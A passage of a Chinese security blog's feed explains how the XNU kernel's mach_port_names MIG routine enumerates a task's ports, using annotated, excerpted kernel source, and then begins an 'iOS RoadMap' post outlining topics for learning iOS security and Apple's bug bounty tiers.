class="line">     */</div><div class="line"></div><div class="line">    Request *In0P = (Request *) InHeadP;</div><div class="line">    Reply *OutP = (Reply *) OutHeadP;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  __MIG_check__Request__mach_port_names_t__defined</span></div><div class="line">    <span class="keyword">kern_return_t</span> check_result;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* __MIG_check__Request__mach_port_names_t__defined */</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> UseStaticTemplates</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">mach_msg_ool_descriptor_t</span> namesTemplate = &#123;</div><div class="line">        <span class="comment">/* addr = */</span>        (<span class="keyword">void</span> *)<span class="number">0</span>,</div><div class="line">        <span class="comment">/* size = */</span>        <span class="number">0</span>,</div><div class="line">        <span class="comment">/* deal = */</span>        FALSE,</div><div class="line">        <span class="comment">/* copy = */</span>        MACH_MSG_VIRTUAL_COPY,</div><div class="line">        <span class="comment">/* pad2 = */</span>        <span class="number">0</span>,</div><div class="line">        <span class="comment">/* type = */</span>        MACH_MSG_OOL_DESCRIPTOR,</div><div class="line">    &#125;;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* UseStaticTemplates */</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> UseStaticTemplates</span></div><div class="line">    <span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">mach_msg_ool_descriptor_t</span> typesTemplate = &#123;</div><div class="line">        <span class="comment">/* addr = */</span>        (<span class="keyword">void</span> *)<span class="number">0</span>,</div><div class="line">        <span class="comment">/* size = */</span>        <span class="number">0</span>,</div><div class="line">        <span class="comment">/* deal = */</span>        FALSE,</div><div class="line">        <span class="comment">/* copy = */</span>        MACH_MSG_VIRTUAL_COPY,</div><div class="line">        <span class="comment">/* pad2 = */</span>        <span class="number">0</span>,</div><div class="line">        <span class="comment">/* type = */</span>        MACH_MSG_OOL_DESCRIPTOR,</div><div class="line">    &#125;;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* UseStaticTemplates */</span></span></div><div class="line"></div><div class="line">    <span class="keyword">kern_return_t</span> RetCode;</div><div class="line">    __DeclareRcvRpc(<span class="number">3200</span>, <span class="string">"mach_port_names"</span>)</div><div class="line">    __BeforeRcvRpc(<span class="number">3200</span>, <span class="string">"mach_port_names"</span>)</div><div class="line"></div><div class="line"><span class="comment">// 检查用户参数</span></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__MIG_check__Request__mach_port_names_t__defined)</span></div><div class="line">    check_result = __MIG_check__Request__mach_port_names_t((__Request *)In0P);</div><div class="line">    <span class="keyword">if</span> (check_result != MACH_MSG_SUCCESS)</div><div class="line">        &#123; MIG_RETURN_ERROR(OutP, check_result); &#125;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* defined(__MIG_check__Request__mach_port_names_t__defined) */</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> UseStaticTemplates</span></div><div class="line">    OutP-&gt;names = namesTemplate;</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span>   <span class="comment">/* UseStaticTemplates */</span></span></div><div class="line">    OutP-&gt;names.deallocate =  FALSE;</div><div class="line">    OutP-&gt;names.copy = MACH_MSG_VIRTUAL_COPY;</div><div class="line">    OutP-&gt;names.pad1 = <span class="number">0</span>;</div><div class="line">    OutP-&gt;names.type = MACH_MSG_OOL_DESCRIPTOR;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(KERNEL) &amp;&amp; !defined(__LP64__)</span></div><div class="line">    OutP-&gt;names.pad_end = <span class="number">0</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* UseStaticTemplates */</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> UseStaticTemplates</span></div><div class="line">    OutP-&gt;types = typesTemplate;</div><div class="line"><span class="meta">#<span class="meta-keyword">else</span>   <span class="comment">/* UseStaticTemplates */</span></span></div><div class="line">    OutP-&gt;types.deallocate =  FALSE;</div><div class="line">    OutP-&gt;types.copy = MACH_MSG_VIRTUAL_COPY;</div><div class="line">    OutP-&gt;types.pad1 = <span class="number">0</span>;</div><div class="line">    OutP-&gt;types.type = MACH_MSG_OOL_DESCRIPTOR;</div><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(KERNEL) &amp;&amp; !defined(__LP64__)</span></div><div class="line">    OutP-&gt;types.pad_end = <span class="number">0</span>;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* UseStaticTemplates */</span></span></div><div class="line"></div><div class="line"></div><div class="line">    OutP-&gt;namesCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">    OutP-&gt;typesCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="comment">// 核心，  调用 mach_port.c 中的 mach_port_names 函数</span></div><div class="line">    RetCode = mach_port_names(In0P-&gt;Head.msgh_request_port, (<span class="keyword">mach_port_name_array_t</span> *)&amp;(OutP-&gt;names.address), &amp;OutP-&gt;namesCnt, (<span class="keyword">mach_port_type_array_t</span> *)&amp;(OutP-&gt;types.address), &amp;OutP-&gt;typesCnt);</div><div class="line">    <span class="keyword">if</span> (RetCode != KERN_SUCCESS) &#123;</div><div class="line">        MIG_RETURN_ERROR(OutP, RetCode);</div><div class="line">    &#125;</div><div class="line">    OutP-&gt;names.size = OutP-&gt;namesCnt * <span class="number">4</span>;</div><div class="line"></div><div class="line">    OutP-&gt;types.size = OutP-&gt;typesCnt * <span class="number">4</span>;</div><div class="line"></div><div class="line"></div><div class="line">    OutP-&gt;NDR = NDR_record;</div><div class="line"></div><div class="line"></div><div class="line">    OutP-&gt;Head.msgh_bits |= MACH_MSGH_BITS_COMPLEX;</div><div class="line">    OutP-&gt;Head.msgh_size = (<span class="keyword">mach_msg_size_t</span>)(<span class="keyword">sizeof</span>(Reply));</div><div class="line">    OutP-&gt;msgh_body.msgh_descriptor_count = <span class="number">2</span>;</div><div class="line">    __AfterRcvRpc(<span class="number">3200</span>, <span class="string">"mach_port_names"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>现在看下 osfmk/mach/mach_port.c 中mach_port_names 的实现。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">kern_return_t</span></div><div class="line">mach_port_names(</div><div class="line">    <span class="keyword">ipc_space_t</span>     space,</div><div class="line">    <span class="keyword">mach_port_name_t</span>    **namesp,</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span>  *namesCnt,</div><div class="line">    <span class="keyword">mach_port_type_t</span>    **typesp,</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span>  *typesCnt)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">ipc_entry_t</span> table;</div><div class="line">    <span class="keyword">ipc_entry_num_t</span> tsize;</div><div class="line">    <span class="keyword">mach_port_index_t</span> index;</div><div class="line">    <span class="keyword">ipc_entry_num_t</span> actual; <span class="comment">/* this many names */</span></div><div class="line">    <span class="keyword">ipc_port_timestamp_t</span> timestamp; <span class="comment">/* logical time of this operation */</span></div><div class="line">    <span class="keyword">mach_port_name_t</span> *names;</div><div class="line">    <span class="keyword">mach_port_type_t</span> *types;</div><div class="line">    <span class="keyword">kern_return_t</span> kr;</div><div class="line"></div><div class="line">    <span class="keyword">vm_size_t</span> size;     <span class="comment">/* size of allocated memory */</span></div><div class="line">    <span class="keyword">vm_offset_t</span> addr1;  <span class="comment">/* allocated memory, for names */</span></div><div class="line">    <span class="keyword">vm_offset_t</span> addr2;  <span class="comment">/* allocated memory, for types */</span></div><div class="line">    <span class="keyword">vm_map_copy_t</span> memory1;  <span class="comment">/* copied-in memory, for names */</span></div><div class="line">    <span class="keyword">vm_map_copy_t</span> memory2;  <span class="comment">/* copied-in memory, for types */</span></div><div class="line"></div><div class="line">    <span class="comment">/* safe simplifying assumption */</span></div><div class="line">    <span class="keyword">static_assert</span>(<span class="keyword">sizeof</span>(<span class="keyword">mach_port_name_t</span>) == <span class="keyword">sizeof</span>(<span class="keyword">mach_port_type_t</span>));</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (space == IS_NULL)</div><div class="line">        <span class="keyword">return</span> KERN_INVALID_TASK;</div><div class="line"></div><div class="line">    size = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (;;) &#123;</div><div class="line">        <span class="keyword">ipc_entry_num_t</span> bound;</div><div class="line">        <span class="keyword">vm_size_t</span> size_needed;</div><div class="line"></div><div class="line">        is_read_lock(space);</div><div class="line">        <span class="keyword">if</span> (!is_active(space)) &#123;</div><div class="line">            is_read_unlock(space);</div><div class="line">            <span class="keyword">if</span> (size != <span class="number">0</span>) &#123;</div><div class="line">                kmem_free(ipc_kernel_map, addr1, size);</div><div class="line">                kmem_free(ipc_kernel_map, addr2, size);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span> KERN_INVALID_TASK;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">/* upper bound on number of names in the space */</span></div><div class="line">        bound = space-&gt;is_table_size;</div><div class="line">        size_needed = vm_map_round_page(</div><div class="line">            (bound * <span class="keyword">sizeof</span>(<span class="keyword">mach_port_name_t</span>)),</div><div class="line">            VM_MAP_PAGE_MASK(ipc_kernel_map));</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (size_needed &lt;= size)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (size != <span class="number">0</span>) &#123;</div><div class="line">            kmem_free(ipc_kernel_map, addr1, size);</div><div class="line">            kmem_free(ipc_kernel_map, addr2, size);</div><div class="line">        &#125;</div><div class="line">        size = size_needed;</div><div class="line"></div><div class="line">        kr = vm_allocate(ipc_kernel_map, &amp;addr1, size, VM_FLAGS_ANYWHERE | VM_MAKE_TAG(VM_KERN_MEMORY_IPC));</div><div class="line">        <span class="keyword">if</span> (kr != KERN_SUCCESS)</div><div class="line">            <span class="keyword">return</span> KERN_RESOURCE_SHORTAGE;</div><div class="line"></div><div class="line">        kr = vm_allocate(ipc_kernel_map, &amp;addr2, size, VM_FLAGS_ANYWHERE | VM_MAKE_TAG(VM_KERN_MEMORY_IPC));</div><div class="line">        <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</div><div class="line">            kmem_free(ipc_kernel_map, addr1, size);</div><div class="line">            <span class="keyword">return</span> KERN_RESOURCE_SHORTAGE;</div><div class="line">        &#125;</div><div class="line"></div><div class="line"></div><div class="line">        kr = vm_map_wire(</div><div class="line">            ipc_kernel_map,</div><div class="line">            vm_map_trunc_page(addr1,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map)),</div><div class="line">            vm_map_round_page(addr1 + size,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map)),</div><div class="line">            VM_PROT_READ|VM_PROT_WRITE|VM_PROT_MEMORY_TAG_MAKE(VM_KERN_MEMORY_IPC),</div><div class="line">            FALSE);</div><div class="line">        <span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</div><div class="line">            kmem_free(ipc_kernel_map, addr1, size);</div><div class="line">            kmem_free(ipc_kernel_map, addr2, size);</div><div class="line">            <span class="keyword">return</span> KERN_RESOURCE_SHORTAGE;</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* space is read-locked and active */</span></div><div class="line"></div><div class="line">    names = (<span class="keyword">mach_port_name_t</span> *) addr1;</div><div class="line">    types = (<span class="keyword">mach_port_type_t</span> *) addr2;</div><div class="line">    actual = <span class="number">0</span>;</div><div class="line"></div><div class="line">    timestamp = ipc_port_timestamp();</div><div class="line"></div><div class="line">    table = space-&gt;is_table;</div><div class="line">    tsize = space-&gt;is_table_size;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// 这里 从target task 的 ipc_space 中取出 space-&gt;is_table 中所有 entry.</span></div><div class="line"><span class="comment">// 根据 entry-&gt;ie_bits 可知该 entry 是否分配给了 port。</span></div><div class="line">    <span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; tsize; index++) &#123;</div><div class="line">        <span class="keyword">ipc_entry_t</span> entry = &amp;table[index];</div><div class="line">        <span class="keyword">ipc_entry_bits_t</span> bits = entry-&gt;ie_bits;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (IE_BITS_TYPE(bits) != MACH_PORT_TYPE_NONE) &#123;</div><div class="line">            <span class="keyword">mach_port_name_t</span> name;</div><div class="line"></div><div class="line">            name = MACH_PORT_MAKE(index, IE_BITS_GEN(bits));</div><div class="line"></div><div class="line">            <span class="comment">// 将 name和对应的 type（entry-&gt;ie_bits） 存储到数组 names 和 types中， actual 是数组的长度。</span></div><div class="line">            mach_port_names_helper(timestamp, entry, name, names,</div><div class="line">                           types, &amp;actual);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    is_read_unlock(space);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (actual == <span class="number">0</span>) &#123;</div><div class="line">        memory1 = VM_MAP_COPY_NULL;</div><div class="line">        memory2 = VM_MAP_COPY_NULL;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (size != <span class="number">0</span>) &#123;</div><div class="line">            kmem_free(ipc_kernel_map, addr1, size);</div><div class="line">            kmem_free(ipc_kernel_map, addr2, size);</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">vm_size_t</span> size_used;</div><div class="line">        <span class="keyword">vm_size_t</span> vm_size_used;</div><div class="line"></div><div class="line">        size_used = actual * <span class="keyword">sizeof</span>(<span class="keyword">mach_port_name_t</span>);</div><div class="line">        vm_size_used =</div><div class="line">            vm_map_round_page(size_used,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map));</div><div class="line"></div><div class="line"></div><div class="line">        kr = vm_map_unwire(</div><div class="line">            ipc_kernel_map,</div><div class="line">            vm_map_trunc_page(addr1,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map)),</div><div class="line">            vm_map_round_page(addr1 + vm_size_used,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map)),</div><div class="line">            FALSE);</div><div class="line">        assert(kr == KERN_SUCCESS);</div><div class="line"></div><div class="line"><span class="comment">// 释放addr1, addr2没有的空间</span></div><div class="line">        kr = vm_map_unwire(</div><div class="line">            ipc_kernel_map,</div><div class="line">            vm_map_trunc_page(addr2,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map)),</div><div class="line">            vm_map_round_page(addr2 + vm_size_used,</div><div class="line">                      VM_MAP_PAGE_MASK(ipc_kernel_map)),</div><div class="line">            FALSE);</div><div class="line">        assert(kr == KERN_SUCCESS);</div><div class="line"></div><div class="line"><span class="comment">//将 addr1 中的 ports 拷贝到 memory1</span></div><div class="line">        kr = vm_map_copyin(ipc_kernel_map, (<span class="keyword">vm_map_address_t</span>)addr1,</div><div class="line">                   (<span class="keyword">vm_map_size_t</span>)size_used, TRUE, &amp;memory1);</div><div class="line">        assert(kr == KERN_SUCCESS);</div><div class="line"></div><div class="line">        kr = vm_map_copyin(ipc_kernel_map, (<span class="keyword">vm_map_address_t</span>)addr2,</div><div class="line">                   (<span class="keyword">vm_map_size_t</span>)size_used, TRUE, &amp;memory2);</div><div class="line">        assert(kr == KERN_SUCCESS);</div><div class="line"></div><div class="line">        ....</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    *namesp = (<span class="keyword">mach_port_name_t</span> *) memory1;</div><div class="line">    *namesCnt = actual;</div><div class="line">    *typesp = (<span class="keyword">mach_port_type_t</span> *) memory2;</div><div class="line">    *typesCnt = actual;</div><div class="line">    <span class="keyword">return</span> KERN_SUCCESS;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 生成 gen</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IE_BITS_GEN_MASK    0xff000000  <span class="comment">/* 8 bits for generation */</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IE_BITS_GEN(bits)   ((bits) &amp; IE_BITS_GEN_MASK)</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">mach_port_names_helper</span><span class="params">(</span></div><div class="line">    <span class="keyword">ipc_port_timestamp_t</span>    timestamp,</div><div class="line">    <span class="keyword">ipc_entry_t</span>     entry,</div><div class="line">    <span class="keyword">mach_port_name_t</span>    name,</div><div class="line">    <span class="keyword">mach_port_name_t</span>    *names,</div><div class="line">    <span class="keyword">mach_port_type_t</span>    *types,</div><div class="line">    <span class="keyword">ipc_entry_num_t</span>     *actualp)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">ipc_entry_bits_t</span> bits;</div><div class="line">    <span class="keyword">ipc_port_request_index_t</span> request;</div><div class="line">    <span class="keyword">mach_port_type_t</span> type = <span class="number">0</span>;</div><div class="line">    <span class="keyword">ipc_entry_num_t</span> actual;</div><div class="line">    <span class="keyword">ipc_port_t</span> port;</div><div class="line"></div><div class="line">    bits = entry-&gt;ie_bits;</div><div class="line">    request = entry-&gt;ie_request;</div><div class="line">    __IGNORE_WCASTALIGN(port = (<span class="keyword">ipc_port_t</span>) entry-&gt;ie_object);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (bits &amp; MACH_PORT_TYPE_RECEIVE) &#123;</div><div class="line">        assert(IP_VALID(port));</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (request != IE_REQ_NONE) &#123;</div><div class="line">   ...</div><div class="line">            type |= ipc_port_request_type(port, name, request);</div><div class="line">..</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bits &amp; MACH_PORT_TYPE_SEND_RIGHTS) &#123;</div><div class="line">        ...</div><div class="line">        reqtype = (request != IE_REQ_NONE) ?</div><div class="line">              ipc_port_request_type(port, name, request) : <span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (ip_active(port) || IP_TIMESTAMP_ORDER(timestamp, port-&gt;ip_timestamp)) &#123;</div><div class="line">            type |= reqtype;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            bits &amp;= ~(IE_BITS_TYPE_MASK);</div><div class="line">            bits |= MACH_PORT_TYPE_DEAD_NAME;</div><div class="line">            <span class="comment">/* account for additional reference for dead-name notification */</span></div><div class="line">            <span class="keyword">if</span> (reqtype != <span class="number">0</span>)</div><div class="line">                bits++;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    type |= IE_BITS_TYPE(bits);</div><div class="line"></div><div class="line">    actual = *actualp;</div><div class="line">    names[actual] = name;</div><div class="line">    types[actual] = type;</div><div class="line">    *actualp = actual+<span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">mach_port_type_t</span></div><div class="line">ipc_port_request_type(</div><div class="line">    <span class="keyword">ipc_port_t</span>          port,</div><div class="line">    __assert_only <span class="keyword">mach_port_name_t</span>  name,</div><div class="line">    <span class="keyword">ipc_port_request_index_t</span>    index)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">ipc_port_request_t</span> ipr, table;</div><div class="line">    <span class="keyword">mach_port_type_t</span> type = <span class="number">0</span>;</div><div class="line"></div><div class="line">    table = port-&gt;ip_requests;</div><div class="line">    assert (table != IPR_NULL);</div><div class="line"></div><div class="line">    assert(index != IE_REQ_NONE);</div><div class="line">    ipr = &amp;table[index];</div><div class="line">    assert(ipr-&gt;ipr_name == name);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (IP_VALID(IPR_SOR_PORT(ipr-&gt;ipr_soright))) &#123;</div><div class="line">        type |= MACH_PORT_TYPE_DNREQUEST;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (IPR_SOR_SPREQ(ipr-&gt;ipr_soright)) &#123;</div><div class="line">            type |= MACH_PORT_TYPE_SPREQUEST;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (!IPR_SOR_SPARMED(ipr-&gt;ipr_soright)) &#123;</div><div class="line">                type |= MACH_PORT_TYPE_SPREQUEST_DELAYED;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> type;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="搞清楚-mach-port-names-原理"><a href="#搞清楚-mach-port-names-原理" class="headerlink" title="搞清楚 mach_port_names 原理"></a>搞清楚 mach_port_names 原理</h3><p>原理就是 通过获取 目标进程的 task_t 对象， 然后获取 ipc_space 对象，从 ipc_space 的 is_table 遍历所有 entry, 根据 ie_bits 找到已经分配的 entry.</p>
<p>计算 port name ==&gt; <code>name = MACH_PORT_MAKE(index, IE_BITS_GEN(bits));</code><br>获取 type的逻辑 需要注意：</p>
<ol>
<li>获取 ipc_prot 对象（port）， entry-&gt;ie_object</li>
<li>获取请求的数组索引，entry-&gt;ie_request</li>
<li>获取请求数组 ，port-&gt;ip_requests</li>
<li>根据 ipr-&gt;ipr_soright 赋予 type 值</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;在《深入解析MAC OS X &amp;amp; iOS 操作系统》书上，代码清单10-1 中有一个例子 “Mach 端口导出器”， 分析代码流程搞清楚 MIG 的作用。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="了解" scheme="http://yoursite.com/tags/%E4%BA%86%E8%A7%A3/"/>
    
      <category term="xnu" scheme="http://yoursite.com/tags/xnu/"/>
    
      <category term="mach" scheme="http://yoursite.com/tags/mach/"/>
    
  </entry>
  
  <entry>
    <title>iOS RoadMap</title>
    <link href="http://yoursite.com/2017/02/08/iOS-roadMap/"/>
    <id>http://yoursite.com/2017/02/08/iOS-roadMap/</id>
    <published>2017-02-08T05:58:07.000Z</published>
    <updated>2017-03-09T16:42:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>学习iOS安全的技术路线，分为：开发，工具，iOS安全模块，漏洞利用， 漏洞挖掘 5个模块。<br>(模块会发生变动)</p>
<a id="more"></a>
<p><img src="/include/img/iOS.jpg" alt="sdf"></p>
<h3 id="开发篇"><a href="#开发篇" class="headerlink" title="开发篇"></a>开发篇</h3><ol>
<li>语言 （swift, <a href="http://zh-google-styleguide.readthedocs.io/en/latest/google-objc-styleguide/contents/" target="_blank" rel="external">object-C</a>）</li>
<li>tweak</li>
<li>系统调用，开发模块(ioKit，消息响应等)</li>
</ol>
<h3 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h3><ol>
<li>砸壳工具</li>
<li>静态分析工具</li>
<li>动态调试工具</li>
<li>其他工具</li>
<li>脚本</li>
</ol>
<h3 id="iOS安全摸块"><a href="#iOS安全摸块" class="headerlink" title="iOS安全摸块"></a>iOS安全摸块</h3><ol>
<li>APP格式/组成</li>
<li>静态分析方法 (Arm64)</li>
<li><a href="http://bbs.iosre.com/t/debugserver-lldb-gdb/65" target="_blank" rel="external">动态调试方法</a><ol>
<li>应用调试</li>
<li>框架调试</li>
<li>内核调试</li>
</ol>
</li>
<li>重打包</li>
<li>砸壳原理</li>
</ol>
<h3 id="系统漏洞模块"><a href="#系统漏洞模块" class="headerlink" title="系统漏洞模块"></a>系统漏洞模块</h3><ol>
<li>提权</li>
<li>远程</li>
<li>越狱</li>
</ol>
<p>2017年春节后，蒸米在其 github 中发布一篇2016 iOS漏洞总结的文章，里面介绍的都是2016年的精华漏洞。<br><a href="/include/txt/2016年iOS公开可利用漏洞总结_CN.docx">2016年iOS公开可利用漏洞总结_CN</a></p>
<p>Apple 漏洞奖励计划</p>
<table>
<thead>
<tr>
<th>赏金类型</th>
<th>奖励金额</th>
</tr>
</thead>
<tbody>
<tr>
<td>安全启动固件组件</td>
<td>最高$200000</td>
</tr>
<tr>
<td>保护机密材料提取的安全协议处理器</td>
<td>最高$100000</td>
</tr>
<tr>
<td>执行任意代码内核权限</td>
<td>最高$50000</td>
</tr>
<tr>
